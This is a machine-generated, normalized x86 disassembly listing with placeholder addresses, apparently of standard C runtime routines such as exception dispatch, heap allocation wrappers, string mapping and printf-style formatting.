push edi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_418619
add esp 0x10
push [ edi + 0x1c ]
call sub_417d50
push [ ebp - 0x24 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x2c ]
push [ ebp - 0x30 ]
push [ ebp - 0xc ]
push edi
push [ ebp + 0x14 ]
push [ ebp + 0x8 ]
push ebx
push esi
call sub_417d90
add esp 0x2c
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0x1c ]
mov ecx [ ebp - 0xc ]
dec eax
add edx 0x4
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
jmp r-xdata
jmp r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0x8 ]
mov ecx [ ebp - 0x10 ]
sub_4181f3
push ebp
mov ebp esp
push ecx
push ecx
push edi
mov edi [ ebp + 0x8 ]
cmp [ edi ] 0x80000003
je r-xdata
pop edi
leave
retn
push ebx
push esi
call sub_41686e
cmp [ eax + 0x80 ] 0x0
mov ebx [ ebp + 0x18 ]
je r-xdata
cmp [ ebx + 0xc ] 0x0
jne r-xdata
push 0x0
call [ EncodePointer@IAT ]
mov esi eax
call sub_41686e
cmp [ eax + 0x80 ] esi
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x1c ]
push [ ebp + 0x20 ]
push ebx
call sub_411658
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
add esp 0x14
cmp ecx edx
jae r-xdata
call sub_4170d0
cmp [ edi ] 0xe0434f4d
je r-xdata
pop esi
pop ebx
lea esi [ eax + 0xc ]
mov eax [ ebp + 0x1c ]
cmp [ edi ] 0xe0434352
je r-xdata
inc ecx
add esi 0x14
mov [ ebp - 0x8 ] ecx
cmp ecx edx
jb r-xdata
cmp eax [ esi - 0x8 ]
jg r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_411583
add esp 0x1c
test eax eax
jne r-xdata
cmp eax [ esi - 0xc ]
jl r-xdata
mov eax [ esi ]
mov edi [ esi + 0x4 ]
shl eax 0x4
mov edi [ edi + eax - 0xc ]
test edi edi
je r-xdata
mov edi [ esi + 0x4 ]
add edi 0xfffffff0
add eax edi
mov edi [ ebp + 0x8 ]
test [ eax ] 0x40
jne r-xdata
mov edx [ esi + 0x4 ]
mov ebx [ edx + eax - 0xc ]
mov edx [ ebp - 0x4 ]
cmp [ ebx + 0x8 ] 0x0
mov ebx [ ebp + 0x18 ]
jne r-xdata
mov eax [ ebp + 0x1c ]
push 0x1
push [ ebp + 0x24 ]
lea ecx [ esi - 0xc ]
push [ ebp + 0x20 ]
push ecx
push 0x0
push eax
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edi
call sub_417d90
mov edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x8 ]
add esp 0x2c
sub_41830d
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
test esi esi
je r-xdata
call sub_4170d0
xor ebx ebx
mov edi ebx
cmp [ esi ] ebx
jle r-xdata
pop edi
pop esi
mov al bl
pop ebx
leave
retn
mov ecx ebx
mov [ ebp + 0xc ] ebx
inc edi
add ecx 0x10
mov [ ebp + 0xc ] ecx
cmp edi [ esi ]
jl r-xdata
mov eax [ ebp + 0x8 ]
push [ eax + 0x1c ]
mov eax [ esi + 0x4 ]
push [ edx ]
add eax ecx
push eax
call sub_4187d1
mov ecx [ ebp + 0xc ]
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x1c ]
mov eax [ eax + 0xc ]
lea edx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
test eax eax
jle r-xdata
mov bl 0x1
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
dec eax
add edx 0x4
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x8 ] edx
test eax eax
jg r-xdata
jmp r-xdata
sub_418393
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov eax [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
add eax edx
test esi esi
js r-xdata
pop esi
pop ebp
retn
mov ecx [ ecx + 0x8 ]
mov edx [ esi + edx ]
mov ecx [ edx + ecx ]
add ecx esi
add eax ecx
sub_4183b8
push 0x8
push r--data
call sub_411bb0
mov edx [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
test [ edx ] 0x80000000
je r-xdata
lea edi [ ecx + 0xc ]
add edi [ edx + 0x8 ]
mov edi ecx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_418393
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41157c
dec eax
jne r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x14 ]
push esi
push edx
push ecx
mov ebx [ ebp + 0x8 ]
push ebx
call sub_418446
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_411bf5
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ ebx + 0x18 ]
call sub_418393
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push edi
call sub_41157c
jmp r-xdata
sub_418446
push 0xc
push r--data
call sub_411bb0
xor ebx ebx
mov eax [ ebp + 0x10 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
xor eax eax
cmp [ ecx + 0x8 ] bl
je r-xdata
mov ecx [ eax + 0x8 ]
test ecx ecx
jne r-xdata
mov edx [ eax ]
mov edi [ ebp + 0xc ]
test edx edx
js r-xdata
test [ eax ] 0x80000000
je r-xdata
mov [ ebp - 0x4 ] ebx
push 0x1
test dl 0x8
je r-xdata
add edi 0xc
add edi ecx
mov esi [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
test [ esi ] 0x1
je r-xdata
mov esi [ ebp + 0x8 ]
push [ esi + 0x18 ]
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ esi + 0x18 ] ebx
jne r-xdata
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_4170d0
push 0x1
push edi
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ esi + 0x18 ]
mov [ edi ] ecx
mov eax [ ebp + 0x14 ]
add eax 0x8
push eax
push ecx
push 0x1
push edi
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
push 0x1
push edi
call sub_41d2dc
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
push edi
call sub_40ebc0
add esp 0xc
cmp [ esi + 0x14 ] 0x4
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax ebx
jmp r-xdata
push [ esi + 0x18 ]
call sub_41d2dc
pop ecx
test eax eax
je r-xdata
push [ esi + 0x14 ]
lea eax [ esi + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
push [ eax + 0x18 ]
call sub_418393
pop ecx
pop ecx
push eax
push edi
call sub_40ebc0
add esp 0xc
jmp r-xdata
cmp [ edi ] 0x0
je r-xdata
call sub_411bf5
retn
test [ esi ] 0x4
push 0x0
pop ebx
setne bl
inc ebx
mov [ ebp - 0x1c ] ebx
jmp r-xdata
lea eax [ esi + 0x8 ]
push eax
push [ edi ]
jmp r-xdata
call sub_418393
pop ecx
pop ecx
mov [ edi ] eax
jmp r-xdata
sub_4185cb
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
cmp [ eax ] 0xe0434352
je r-xdata
call sub_41686e
cmp [ eax + 0x90 ] 0x0
jle r-xdata
cmp [ eax ] 0xe0434f4d
je r-xdata
xor eax eax
pop ebp
retn
call sub_41686e
dec [ eax + 0x90 ]
cmp [ eax ] 0xe06d7363
jne r-xdata
call sub_41686e
and [ eax + 0x90 ] 0x0
jmp sub_417108
sub_418619
push 0x10
push r--data
call sub_411bb0
mov eax [ ebp + 0x10 ]
cmp [ eax + 0x4 ] 0x80
mov eax [ ebp + 0x8 ]
jg r-xdata
mov esi [ eax + 0x8 ]
movsx esi [ eax + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_4186d8
cmp esi [ ebp + 0x14 ]
je r-xdata
cmp esi 0xffffffff
jle r-xdata
mov [ ebp - 0x1c ] esi
call sub_41686e
inc [ eax + 0x90 ]
and [ ebp - 0x4 ] 0x0
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] esi
call sub_411bf5
retn
call sub_4170d0
call sub_4170d0
mov eax [ ebp + 0x10 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov ecx [ ebp + 0x10 ]
mov eax [ ecx + 0x8 ]
mov edx [ eax + esi * 8 ]
mov [ ebp - 0x20 ] edx
mov [ ebp - 0x4 ] 0x1
cmp [ eax + esi * 8 + 0x4 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
mov esi [ ebp - 0x20 ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x8 ] edx
push 0x103
push eax
mov eax [ ecx + 0x8 ]
push [ eax + esi * 8 + 0x4 ]
call sub_417a60
jmp r-xdata
cmp esi [ ebp + 0x14 ]
je r-xdata
sub_4186f2
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_41686e
mov ecx [ ebp + 0x18 ]
mov edx [ ebp + 0x8 ]
xor esi esi
mov ebx 0xe06d7363
mov edi 0x19930522
cmp [ eax + 0x3ac ] esi
jne r-xdata
test [ edx + 0x4 ] 0x66
je r-xdata
cmp [ edx ] ebx
je r-xdata
cmp [ ecx + 0xc ] esi
jne r-xdata
cmp [ ecx + 0x4 ] esi
je r-xdata
cmp [ edx ] 0x80000026
je r-xdata
cmp [ edx ] ebx
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] esi
jne r-xdata
mov eax [ ecx ]
and eax 0x1fffffff
cmp eax edi
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call sub_417e58
add esp 0x20
cmp [ edx + 0x10 ] 0x3
jb r-xdata
cmp [ ecx + 0x1c ] esi
je r-xdata
push 0xffffffff
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_418619
add esp 0x10
jmp r-xdata
test [ ecx + 0x20 ] 0x1
jne r-xdata
cmp [ edx + 0x14 ] edi
jbe r-xdata
mov eax [ edx + 0x1c ]
mov esi [ eax + 0x8 ]
test esi esi
je r-xdata
movzx eax [ ebp + 0x24 ]
push eax
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push ecx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push edx
call esi
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4187d1
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
xor eax eax
inc eax
lea ecx [ eax + 0x8 ]
cmp [ ecx ] 0x0
je r-xdata
mov edi [ ebp + 0xc ]
mov edx [ edi + 0x4 ]
cmp eax edx
je r-xdata
test [ edi ] 0x2
je r-xdata
lea eax [ edx + 0x8 ]
push eax
push ecx
call sub_411970
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test [ eax ] 0x1
je r-xdata
test [ esi ] 0x8
je r-xdata
xor eax eax
jmp r-xdata
test [ eax ] 0x2
je r-xdata
test [ esi ] 0x1
je r-xdata
pop edi
pop esi
pop ebp
retn
test [ esi ] 0x2
je r-xdata
sub_41882e
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push esi
mov esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push [ ebp + 0xc ]
call sub_40f43a
pop ecx
pop ebp
retn
push ebx
jmp r-xdata
push [ ebp + 0x8 ]
call sub_40f402
pop ecx
xor eax eax
jmp r-xdata
cmp esi 0xffffffe0
jbe r-xdata
pop esi
pop ebp
retn
test esi esi
jne r-xdata
push esi
call sub_411a6d
pop ecx
call sub_412060
mov [ eax ] 0xc
push esi
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapReAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
inc esi
mov eax ebx
jmp r-xdata
cmp [ rw-data ] eax
je r-xdata
pop ebx
call sub_412060
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_412073
pop ecx
mov [ esi ] eax
push esi
call sub_411a6d
pop ecx
test eax eax
je r-xdata
call sub_412060
mov esi eax
call [ GetLastError@IAT ]
push eax
call sub_412073
pop ecx
mov [ esi ] eax
jmp r-xdata
xor eax eax
sub_4188d9
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
imul esi [ ebp + 0xc ]
test esi esi
jne r-xdata
push 0xffffffe0
xor edx edx
pop eax
div esi
cmp eax [ ebp + 0xc ]
jae r-xdata
xor ecx ecx
cmp esi 0xffffffe0
ja r-xdata
inc esi
call sub_412060
cmp [ rw-data ] 0x0
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov ecx eax
test ecx ecx
jne r-xdata
pop esi
pop ebp
retn
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
push esi
call sub_411a6d
pop ecx
test eax eax
jne r-xdata
mov eax ecx
mov [ eax ] 0xc
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov [ eax ] 0xc
sub_41896c
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_41592b
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_418b4e
push ebp
mov ebp esp
push ebx
push esi
push edi
xor edi edi
mov ebx 0xe3
mov eax [ esi * 8 + r--data ]
jns r-xdata
lea edi [ esi + 0x1 ]
lea ebx [ esi - 0x1 ]
jmp r-xdata
lea eax [ ebx + edi ]
cdq
sub eax edx
mov esi eax
sar esi 0x1
push 0x55
push [ esi * 8 + r--data ]
push [ ebp + 0x8 ]
call sub_418c12
add esp 0xc
test eax eax
je r-xdata
or eax 0xffffffff
jmp r-xdata
cmp edi ebx
jle r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_418b9c
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call sub_418b4e
pop ecx
test eax eax
js r-xdata
cmp eax 0xe4
jae r-xdata
mov eax [ eax * 8 + r--data ]
pop ebp
retn
sub_418bc6
push ebp
mov ebp esp
mov eax [ rw-data ]
xor eax [ rw-data ]
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_418b9c
pop ecx
push eax
call [ LCMapStringW@IAT ]
pop ebp
retn
xor ecx ecx
push ecx
push ecx
push ecx
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call eax
pop ebp
retn
sub_418c12
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x10 ]
xor eax eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0xc ]
push ebx
push edi
mov edi [ ebp + 0x8 ]
push 0x41
pop ebx
push 0x5a
pop edx
sub edi ecx
mov [ ebp + 0x10 ] edx
jmp r-xdata
movzx eax [ edi + ecx ]
cmp ax bx
jb r-xdata
mov edx eax
cmp ax dx
ja r-xdata
add ecx 0x2
dec esi
je r-xdata
cmp ax [ ebp + 0x10 ]
ja r-xdata
add eax 0x20
movzx edx ax
jmp r-xdata
movzx ecx ax
movzx eax dx
pop edi
sub eax ecx
pop ebx
test dx dx
je r-xdata
add eax 0x20
movzx eax ax
movzx eax [ ecx ]
cmp ax bx
jb r-xdata
cmp dx ax
je r-xdata
push 0x5a
pop edx
sub_418c80
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
cmp ecx 0xfffffffe
jne r-xdata
test ecx ecx
js r-xdata
call sub_412060
mov [ eax ] 0x9
jmp r-xdata
call sub_412060
mov [ eax ] 0x9
call sub_412224
cmp ecx [ rw-data ]
jae r-xdata
xor eax eax
pop ebp
retn
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
movsx eax [ eax + ecx + 0x4 ]
and eax 0x40
pop ebp
retn
sub_418cd4
push ebp
mov ebp esp
inc [ rw-data ]
push esi
mov esi 0x1000
push esi
call sub_411b1b
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] esi
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop esi
pop ebp
retn
sub_418d1a
push ebp
mov ebp esp
sub esp 0x488
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
mov [ ebp - 0x428 ] eax
xor eax eax
mov ebx eax
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x408 ] esi
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x418 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
call sub_410368
call sub_412060
mov [ ebp - 0x45c ] eax
cmp [ ebp - 0x428 ] ebx
jne r-xdata
test esi esi
je r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
cmp [ ebp - 0x440 ] bl
xor ecx ecx
mov eax ecx
mov edx ecx
mov [ ebp - 0x434 ] ecx
mov [ ebp - 0x458 ] ecx
movzx ecx [ esi ]
mov [ ebp - 0x420 ] eax
mov [ ebp - 0x414 ] edx
mov [ ebp - 0x41c ] ecx
test cx cx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
mov esi [ ebp - 0x46c ]
mov [ ebp - 0x474 ] 0x58
mov [ ebp - 0x47c ] 0x64
mov [ ebp - 0x480 ] 0x69
mov [ ebp - 0x468 ] 0x6f
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40eb9e
leave
retn
mov ecx [ ebp - 0x444 ]
and [ ecx + 0x70 ] 0xfffffffd
mov ecx [ ebp - 0x434 ]
test ecx ecx
je r-xdata
push 0x58
lea eax [ ecx - 0x20 ]
pop edi
cmp ax di
ja r-xdata
cmp ecx 0x7
jne r-xdata
xor eax eax
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
call sub_412060
mov [ eax ] 0x16
call sub_412224
cmp [ ebp - 0x440 ] 0x0
jmp r-xdata
cmp eax 0x7
ja r-xdata
mov edi [ ebp - 0x434 ]
imul eax eax 0x9
movzx edi [ eax + edi + r--data ]
mov eax edi
shr eax 0x4
mov [ ebp - 0x434 ] edi
mov edi [ ebp - 0x40c ]
mov [ ebp - 0x434 ] eax
cmp eax 0x8
je r-xdata
je r-xdata
mov eax [ ebp - 0x408 ]
jmp [ eax * 4 + jump_table_41994e ]
add [ ebp - 0x408 ] 0x2
test eax eax
js r-xdata
xor eax eax
or [ ebp - 0x418 ] 0xffffffff
mov ebx eax
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x42c ] eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x430 ] eax
jmp r-xdata
movzx eax cx
push 0x20
pop ecx
sub eax ecx
je r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
xor eax eax
mov [ ebp - 0x418 ] eax
jmp r-xdata
push 0x2a
pop eax
cmp cx ax
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
lea eax [ ebp - 0x420 ]
push eax
push [ ebp - 0x428 ]
mov [ ebp - 0x430 ] 0x1
push ecx
call sub_413138
add esp 0xc
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
or ebx 0x2
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x424 ]
imul eax eax 0xa
mov [ ebp - 0x424 ] eax
movzx eax cx
mov ecx [ ebp - 0x424 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x424 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
mov [ ebp - 0x424 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x418 ]
imul eax eax 0xa
mov [ ebp - 0x418 ] eax
movzx eax cx
mov ecx [ ebp - 0x418 ]
add ecx 0xffffffd0
add ecx eax
mov [ ebp - 0x418 ] ecx
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] eax
test eax eax
mov eax [ ebp - 0x408 ]
mov [ ebp - 0x40c ] edi
jns r-xdata
mov eax [ ebp - 0x408 ]
movzx eax [ eax ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
mov edx [ ebp - 0x414 ]
cmp eax 0x70
jg r-xdata
je r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or ebx 0x4
neg eax
mov [ ebp - 0x410 ] ebx
mov [ ebp - 0x424 ] eax
jmp r-xdata
movzx ecx [ eax ]
mov eax [ ebp - 0x420 ]
mov [ ebp - 0x41c ] ecx
test cx cx
jne r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x34
jne r-xdata
push 0x20
pop eax
or ebx eax
jmp r-xdata
push 0x6c
pop ecx
cmp eax ecx
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or ebx 0x40
mov [ ebp - 0x410 ] ebx
cmp eax 0x53
jg r-xdata
or ebx 0x1
jmp r-xdata
dec eax
dec eax
je r-xdata
cmp ax [ ebp - 0x47c ]
je r-xdata
mov edi [ ebp - 0x408 ]
cmp [ edi + 0x2 ] 0x32
jne r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
or ebx 0x8000
jmp r-xdata
mov eax [ ebp - 0x408 ]
cmp [ eax ] cx
jne r-xdata
cmp eax 0x77
mov eax [ ebp - 0x408 ]
jne r-xdata
mov eax [ ebp - 0x418 ]
mov edi 0x7fffffff
cmp eax 0xffffffff
je r-xdata
dec eax
dec eax
je r-xdata
mov [ ebp - 0x418 ] 0x8
cmp eax 0x65
jl r-xdata
mov ecx [ edi ]
add edi 0x8
mov [ ebp - 0x40c ] edi
mov edi [ edi - 0x4 ]
jmp r-xdata
test ebx 0x1000
je r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or ebx 0x4
sub eax 0x3
mov eax [ ebp - 0x408 ]
jne r-xdata
cmp ax [ ebp - 0x480 ]
je r-xdata
mov eax edi
add eax 0x4
mov [ ebp - 0x408 ] eax
and ebx 0xffff7fff
jmp r-xdata
mov [ ebp - 0x410 ] ebx
jmp r-xdata
or ebx 0x10
jmp r-xdata
add eax 0x2
mov [ ebp - 0x408 ] eax
or ebx 0x1000
jmp r-xdata
or ebx 0x800
jmp r-xdata
mov esi [ ebp - 0x40c ]
add esi 0x4
mov [ ebp - 0x40c ] esi
mov esi [ esi - 0x4 ]
test bl 0x20
je r-xdata
mov edi eax
mov [ ebp - 0x41c ] 0xa
sub eax 0x3
jne r-xdata
pop eax
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x41c ] 0x10
test bl bl
jns r-xdata
cmp [ ebp - 0x450 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
xor eax eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x40c ] edi
test bl 0x20
je r-xdata
push 0x7
jmp r-xdata
dec eax
dec eax
je r-xdata
test ebx 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or ebx 0x8
cmp ax [ ebp - 0x468 ]
je r-xdata
test esi esi
jne r-xdata
test esi esi
jne r-xdata
push 0x27
test ebx 0x8000
jne r-xdata
push 0x30
pop ecx
add eax 0x51
mov [ ebp - 0x438 ] cx
mov [ ebp - 0x436 ] ax
mov [ ebp - 0x42c ] 0x2
jmp r-xdata
mov eax [ ebp - 0x458 ]
test eax eax
je r-xdata
test bl 0x40
je r-xdata
mov eax [ ebp - 0x418 ]
or ebx 0x40
mov edx 0x200
mov [ ebp - 0x410 ] ebx
lea esi [ ebp - 0x404 ]
mov [ ebp - 0x414 ] edx
test eax eax
jns r-xdata
push 0x69
pop ecx
cmp eax ecx
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
test bl 0x40
je r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x40c ] edi
test eax eax
je r-xdata
sub eax 0x7
je r-xdata
push 0x20
pop eax
or ebx eax
mov [ ebp - 0x410 ] ebx
push 0x20
pop eax
add ecx eax
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x41c ] ecx
dec eax
dec eax
je r-xdata
cmp eax 0x75
je r-xdata
mov [ ebp - 0x430 ] 0x1
mov edx esi
test edi edi
je r-xdata
mov esi [ rw-data ]
xor ecx ecx
